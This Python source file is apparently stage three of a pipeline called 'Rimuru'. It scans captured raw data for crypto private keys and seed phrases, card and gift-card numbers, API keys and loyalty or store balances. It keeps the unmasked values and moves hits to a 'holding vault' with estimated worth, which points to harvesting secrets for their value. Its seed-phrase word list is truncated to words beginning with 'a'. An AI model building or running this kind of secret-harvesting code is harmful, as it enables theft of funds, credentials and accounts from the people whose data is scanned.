"""
RIMURU SECURITY PIPELINE - Stage 3: Scanner/Verification
=========================================================
Universal asset scanner and value verification.
- Crypto wallets (BTC, ETH, SOL, all chains)
- Gift cards (Amazon, Visa, iTunes, Google Play, Steam)
- Loyalty points (airline miles, hotel points, rewards)
- Prepaid cards (Visa/MC prepaid, virtual cards)
- Gold/precious metals (digital gold tokens, PAXG)
- Domain names, NFTs, digital assets
- API keys with remaining credits
- Store credits and balances
"""

import os
import json
import re
import logging
from pathlib import Path
from datetime import datetime, timezone
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass, field
import hashlib
import urllib.request
import urllib.parse

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [SCANNER] %(levelname)s: %(message)s'
)
logger = logging.getLogger('scanner')

# ============================================
# Configuration
# ============================================
SCAN_INCOMING = Path(os.getenv('SCAN_INCOMING', '/quarantine/clean'))
SCAN_VERIFIED = Path(os.getenv('SCAN_VERIFIED', '/vault/holding'))
SCAN_LOG = Path(os.getenv('SCAN_LOG', '/logs/scanner'))


@dataclass
class AssetValue:
    """Verified asset with estimated value"""
    asset_id: str = ''
    asset_category: str = ''       # crypto, gift_card, loyalty, prepaid, gold, nft, api_key, store_credit
    asset_subcategory: str = ''    # eth_wallet, amazon_gc, airline_miles, etc.
    identifier: str = ''           # address, card number (masked), etc.
    estimated_value_usd: float = 0.0
    confidence: float = 0.0        # 0-1 confidence in value
    verified: bool = False
    verification_method: str = ''
    raw_data_hash: str = ''
    details: Dict = field(default_factory=dict)
    scanned_at: str = ''


# ============================================
# Crypto Scanners
# ============================================

class CryptoScanner:
    """Detect and verify cryptocurrency assets"""
    
    PATTERNS = {
        'btc_address': r'\b[13][a-km-zA-HJ-NP-Z1-9]{25,34}\b',
        'btc_bech32': r'\bbc1[a-z0-9]{39,59}\b',
        'eth_address': r'\b0x[a-fA-F0-9]{40}\b',
        'sol_address': r'\b[1-9A-HJ-NP-Za-km-z]{32,44}\b',
        'trx_address': r'\bT[a-zA-Z0-9]{33}\b',
        'ltc_address': r'\b[LM][a-km-zA-HJ-NP-Z1-9]{26,33}\b',
        'doge_address': r'\bD[a-km-zA-HJ-NP-Z1-9]{25,34}\b',
        'xrp_address': r'\br[a-zA-Z0-9]{24,34}\b',
        'private_key_hex': r'\b[a-fA-F0-9]{64}\b',
        'bip39_mnemonic': None,  # Special handler
        'eth_private_key': r'\b0x[a-fA-F0-9]{64}\b',
    }
    
    BIP39_SAMPLE = {
        'abandon', 'ability', 'able', 'about', 'above', 'absent', 'absorb',
        'abstract', 'absurd', 'abuse', 'access', 'accident', 'account',
        'accuse', 'achieve', 'acid', 'acoustic', 'acquire', 'across',
        'act', 'action', 'actor', 'actress', 'actual', 'adapt', 'add',
        'addict', 'address', 'adjust', 'admit', 'adult', 'advance',
        'advice', 'aerobic', 'affair', 'afford', 'afraid', 'again',
        'age', 'agent', 'agree', 'ahead', 'aim', 'air', 'airport',
        'aisle', 'alarm', 'album', 'alcohol', 'alert', 'alien', 'all',
        'alley', 'allow', 'almost', 'alone', 'alpha', 'already', 'also',
        'alter', 'always', 'amateur', 'amazing', 'among', 'amount',
        'amused', 'analyst', 'anchor', 'ancient', 'anger', 'angle',
        'angry', 'animal', 'ankle', 'announce', 'annual', 'another',
        'answer', 'antenna', 'antique', 'anxiety', 'any', 'apart',
        'apology', 'appear', 'apple', 'approve', 'april', 'arch',
        'arctic', 'area', 'arena', 'argue', 'arm', 'armed', 'armor',
        'army', 'arrest', 'arrive', 'arrow', 'art', 'artefact',
        'artist', 'artwork', 'ask', 'aspect', 'assault', 'asset',
        'assist', 'assume', 'asthma', 'athlete', 'atom', 'attack',
        'audit', 'august', 'aunt', 'author', 'auto', 'avocado',
        'avoid', 'awake', 'aware', 'awesome', 'awful', 'awkward', 'axis',
    }
    
    @classmethod
    def scan(cls, text: str) -> List[Dict]:
        """Scan text for crypto addresses, keys, and seeds"""
        findings = []
        
        for pattern_name, pattern in cls.PATTERNS.items():
            if pattern is None:
                continue
            matches = re.findall(pattern, text)
            for match in set(matches):
                findings.append({
                    'type': pattern_name,
                    'value': match,
                    'category': 'crypto',
                })
        
        # BIP39 seed phrase detection
        words = text.lower().split()
        for i in range(len(words) - 11):
            chunk = words[i:i+12]
            bip39_count = sum(1 for w in chunk if w.strip('.,;:') in cls.BIP39_SAMPLE)
            if bip39_count >= 10:
                findings.append({
                    'type': 'bip39_mnemonic',
                    'value': ' '.join(chunk),
                    'category': 'crypto',
                    'word_count': len(chunk),
                })
                # Check for 24-word
                if i + 24 <= len(words):
                    chunk24 = words[i:i+24]
                    bip39_count24 = sum(1 for w in chunk24 if w.strip('.,;:') in cls.BIP39_SAMPLE)
                    if bip39_count24 >= 20:
                        findings[-1]['value'] = ' '.join(chunk24)
                        findings[-1]['word_count'] = 24
        
        return findings


class GiftCardScanner:
    """Detect gift card codes and balances"""
    
    PATTERNS = {
        'amazon_gc': r'\b[A-Z0-9]{4}-[A-Z0-9]{6}-[A-Z0-9]{4}\b',           # Amazon
        'visa_gc': r'\b4[0-9]{15}\b',                                         # Visa
        'mastercard_gc': r'\b5[1-5][0-9]{14}\b',                             # Mastercard
        'amex_gc': r'\b3[47][0-9]{13}\b',                                     # Amex
        'itunes_gc': r'\b[A-Z0-9]{16}\b',                                     # iTunes (generic 16-char)
        'google_play': r'\b[A-Z0-9]{4}\s?[A-Z0-9]{4}\s?[A-Z0-9]{4}\s?[A-Z0-9]{4}\s?[A-Z0-9]{4}\b',
        'steam_gc': r'\b[A-Z0-9]{5}-[A-Z0-9]{5}-[A-Z0-9]{5}\b',
        'xbox_gc': r'\b[A-Z0-9]{5}-[A-Z0-9]{5}-[A-Z0-9]{5}-[A-Z0-9]{5}-[A-Z0-9]{5}\b',
        'generic_gc': r'(?:gift\s*card|giftcard|gc)[:\s#]*([A-Za-z0-9\-]{8,25})',
    }
    
    CONTEXT_KEYWORDS = [
        'gift card', 'giftcard', 'prepaid', 'balance', 'redeem',
        'claim code', 'redemption', 'store credit', 'e-gift',
        'pin:', 'cvv:', 'exp:', 'card number',
    ]
    
    @classmethod
    def scan(cls, text: str) -> List[Dict]:
        findings = []
        text_lower = text.lower()
        
        # Check if gift card context exists
        has_context = any(kw in text_lower for kw in cls.CONTEXT_KEYWORDS)
        
        for pattern_name, pattern in cls.PATTERNS.items():
            matches = re.findall(pattern, text, re.IGNORECASE)
            for match in set(matches):
                confidence = 0.7 if has_context else 0.3
                findings.append({
                    'type': pattern_name,
                    'value': cls._mask(match),
                    'raw_value': match,
                    'category': 'gift_card',
                    'confidence': confidence,
                    'has_context': has_context,
                })
        
        return findings
    
    @staticmethod
    def _mask(value: str) -> str:
        """Mask middle of card number for security"""
        if len(value) > 8:
            return value[:4] + '*' * (len(value) - 8) + value[-4:]
        return value


class LoyaltyScanner:
    """Detect loyalty program accounts and points"""
    
    PROGRAMS = {
        'airline_miles': [
            r'(?:frequent\s*flyer|ff)\s*(?:number|#|no\.?)\s*[:\s]*([A-Z0-9]{6,13})',
            r'(?:miles?|points?)\s*(?:balance|total)\s*[:\s]*([0-9,]+)',
            r'(?:delta|united|american|southwest|jetblue|alaska)\s*(?:skymiles?|mileageplus|aadvantage)',
        ],
        'hotel_points': [
            r'(?:marriott|hilton|hyatt|ihg|wyndham)\s*(?:bonvoy|honors|globalist|rewards)',
            r'(?:hotel\s*)?(?:points?|rewards?)\s*(?:balance|total)\s*[:\s]*([0-9,]+)',
        ],
        'cashback': [
            r'(?:cashback|cash\s*back|rewards?)\s*(?:balance|total|available)\s*[:\s]*\$?([0-9,.]+)',
            r'(?:credit\s*card\s*)?(?:rewards?|points?)\s*[:\s]*([0-9,]+)',
        ],
    }
    
    @classmethod
    def scan(cls, text: str) -> List[Dict]:
        findings = []
        for program_type, patterns in cls.PROGRAMS.items():
            for pattern in patterns:
                matches = re.findall(pattern, text, re.IGNORECASE)
                for match in matches:
                    findings.append({
                        'type': program_type,
                        'value': match if isinstance(match, str) else match[0],
                        'category': 'loyalty',
                    })
        return findings


class GoldAssetScanner:
    """Detect digital gold and precious metal tokens"""
    
    PATTERNS = {
        'paxg_token': r'(?:PAXG|PAX\s*Gold)',
        'xaut_token': r'(?:XAUT|Tether\s*Gold)',
        'dgld_token': r'(?:DGLD|Digital\s*Gold)',
        'gold_amount': r'(\d+\.?\d*)\s*(?:oz|ounce|troy|gram|kg)\s*(?:of\s+)?gold',
        'gold_certificate': r'gold\s*(?:certificate|voucher|token)\s*(?:#|number)?\s*[:\s]*([A-Z0-9\-]+)',
    }
    
    @classmethod
    def scan(cls, text: str) -> List[Dict]:
        findings = []
        for pattern_name, pattern in cls.PATTERNS.items():
            matches = re.findall(pattern, text, re.IGNORECASE)
            for match in matches:
                findings.append({
                    'type': pattern_name,
                    'value': match if isinstance(match, str) else str(match),
                    'category': 'gold',
                })
        return findings


class APIKeyScanner:
    """Detect API keys with potential remaining credits"""
    
    PATTERNS = {
        'openai_key': r'\bsk-[a-zA-Z0-9]{20,}\b',
        'stripe_key': r'\b(sk|pk)_(test|live)_[a-zA-Z0-9]{24,}\b',
        'aws_key': r'\bAKIA[A-Z0-9]{16}\b',
        'twilio_sid': r'\bAC[a-f0-9]{32}\b',
        'sendgrid_key': r'\bSG\.[a-zA-Z0-9\-_]{22,}\.[a-zA-Z0-9\-_]{22,}\b',
        'github_token': r'\bghp_[a-zA-Z0-9]{36}\b',
        'generic_api_key': r'(?:api[_\-]?key|apikey|api[_\-]?token)\s*[=:]\s*["\']?([a-zA-Z0-9\-_]{20,})',
    }
    
    @classmethod
    def scan(cls, text: str) -> List[Dict]:
        findings = []
        for pattern_name, pattern in cls.PATTERNS.items():
            matches = re.findall(pattern, text, re.IGNORECASE)
            for match in set(matches):
                findings.append({
                    'type': pattern_name,
                    'value': match[:8] + '...' + match[-4:] if len(match) > 16 else match,
                    'raw_value': match,
                    'category': 'api_key',
                })
        return findings


class StoreCreditScanner:
    """Detect store credits, coupons, and promotional balances"""
    
    PATTERNS = {
        'store_credit': r'(?:store\s*credit|credit\s*balance)\s*[:\s]*\$?([0-9,.]+)',
        'coupon_code': r'(?:coupon|promo|discount)\s*(?:code)?\s*[:\s]*([A-Z0-9\-]{4,20})',
        'referral_bonus': r'(?:referral|bonus|reward)\s*(?:balance|credit)?\s*[:\s]*\$?([0-9,.]+)',
        'account_balance': r'(?:account|wallet)\s*balance\s*[:\s]*\$?([0-9,.]+)',
    }
    
    @classmethod
    def scan(cls, text: str) -> List[Dict]:
        findings = []
        for pattern_name, pattern in cls.PATTERNS.items():
            matches = re.findall(pattern, text, re.IGNORECASE)
            for match in matches:
                findings.append({
                    'type': pattern_name,
                    'value': match,
                    'category': 'store_credit',
                })
        return findings


# ============================================
# Main Scanner Service
# ============================================

class ScannerService:
    """
    Stage 3: Universal Asset Scanner & Verification
    
    Scans clean quarantine assets for all types of value:
    - Cryptocurrency (addresses, keys, seeds)
    - Gift cards
    - Loyalty points
    - Gold/precious metals
    - API keys with credits
    - Store credits
    """
    
    SCANNERS = [
        ('crypto', CryptoScanner),
        ('gift_card', GiftCardScanner),
        ('loyalty', LoyaltyScanner),
        ('gold', GoldAssetScanner),
        ('api_key', APIKeyScanner),
        ('store_credit', StoreCreditScanner),
    ]
    
    def __init__(self):
        self.stats = {
            'total_scanned': 0,
            'assets_found': 0,
            'total_estimated_value': 0.0,
            'by_category': {},
            'started_at': datetime.now(timezone.utc).isoformat(),
        }
        
        for d in [SCAN_INCOMING, SCAN_VERIFIED, SCAN_LOG]:
            d.mkdir(parents=True, exist_ok=True)
    
    def scan_asset(self, asset_dir: Path) -> List[AssetValue]:
        """Scan a single asset for all types of value"""
        manifest_path = asset_dir / 'manifest.json'
        data_path = asset_dir / 'raw_data.bin'
        
        if not data_path.exists():
            return []
        
        data = data_path.read_bytes()
        text = data.decode('utf-8', errors='ignore')
        manifest = json.loads(manifest_path.read_text()) if manifest_path.exists() else {}
        asset_id = manifest.get('asset_id', asset_dir.name)
        
        all_findings = []
        
        for category, scanner_class in self.SCANNERS:
            try:
                findings = scanner_class.scan(text)
                for finding in findings:
                    av = AssetValue(
                        asset_id=asset_id,
                        asset_category=finding.get('category', category),
                        asset_subcategory=finding.get('type', ''),
                        identifier=finding.get('value', ''),
                        confidence=finding.get('confidence', 0.5),
                        raw_data_hash=hashlib.sha256(data).hexdigest(),
                        details=finding,
                        scanned_at=datetime.now(timezone.utc).isoformat(),
                    )
                    all_findings.append(av)
            except Exception as e:
                logger.error(f"Scanner {category} failed: {e}")
        
        return all_findings
    
    def process_clean_queue(self) -> List[Dict]:
        """Process all clean quarantine assets"""
        results = []
        
        if not SCAN_INCOMING.exists():
            return results
        
        for asset_dir in sorted(SCAN_INCOMING.iterdir()):
            if not asset_dir.is_dir():
                continue
            
            logger.info(f"Scanning {asset_dir.name}...")
            findings = self.scan_asset(asset_dir)
            self.stats['total_scanned'] += 1
            
            if findings:
                self.stats['assets_found'] += len(findings)
                
                # Write scan results
                scan_results = []
                for f in findings:
                    result = {
                        'asset_id': f.asset_id,
                        'category': f.asset_category,
                        'subcategory': f.asset_subcategory,
                        'identifier': f.identifier,
                        'estimated_value_usd': f.estimated_value_usd,
                        'confidence': f.confidence,
                        'verified': f.verified,
                        'scanned_at': f.scanned_at,
                    }
                    scan_results.append(result)
                    
                    # Track by category
                    cat = f.asset_category
                    if cat not in self.stats['by_category']:
                        self.stats['by_category'][cat] = 0
                    self.stats['by_category'][cat] += 1
                
                (asset_dir / 'scan_results.json').write_text(json.dumps(scan_results, indent=2))
                
                # Move to holding vault
                import shutil
                dest = SCAN_VERIFIED / asset_dir.name
                dest.parent.mkdir(parents=True, exist_ok=True)
                if dest.exists():
                    shutil.rmtree(dest)
                shutil.move(str(asset_dir), str(dest))
                
                logger.info(f"  Found {len(findings)} assets → holding vault")
                results.extend(scan_results)
            else:
                logger.info(f"  No assets found")
        
        return results
    
    def get_stats(self) -> Dict:
        return self.stats


# ============================================
# FastAPI Interface
# ============================================
try:
    from fastapi import FastAPI
    import uvicorn
    
    app = FastAPI(
        title="Rimuru Pipeline - Stage 3: Scanner",
        description="Universal asset scanner and verification",
        version="1.0.0"
    )
    
    service = ScannerService()
    
    @app.get("/health")
    async def health():
        return {"status": "healthy", "stage": "scanner", "stats": service.get_stats()}
    
    @app.post("/scan")
    async def scan_all():
        results = service.process_clean_queue()
        return {"scanned": service.stats['total_scanned'], "found": len(results), "results": results}
    
    @app.get("/stats")
    async def stats():
        return service.get_stats()

except ImportError:
    app = None

if __name__ == "__main__":
    if app:
        port = int(os.getenv('SCANNER_PORT', 8503))
        uvicorn.run(app, host="0.0.0.0", port=port)
    else:
        service = ScannerService()
        results = service.process_clean_queue()
        print(f"Found {len(results)} assets")
